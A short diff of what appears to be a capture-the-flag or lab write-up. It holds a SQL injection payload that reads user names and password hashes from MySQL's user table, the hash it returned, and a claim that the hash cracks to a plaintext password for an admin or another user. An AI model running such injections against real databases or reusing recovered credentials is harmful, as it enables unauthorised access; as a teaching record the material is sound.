@@ -93,7 +93,8 @@ this returns user: `root@localhost`
 
 lucky guess:
 term=1'union slect user,password,3 from mysql.user--
-hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
+
+this returns hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
 ```
 
 SHA-1 hash decodes to `Welkom1!`. This could be either admin or gio's password. 
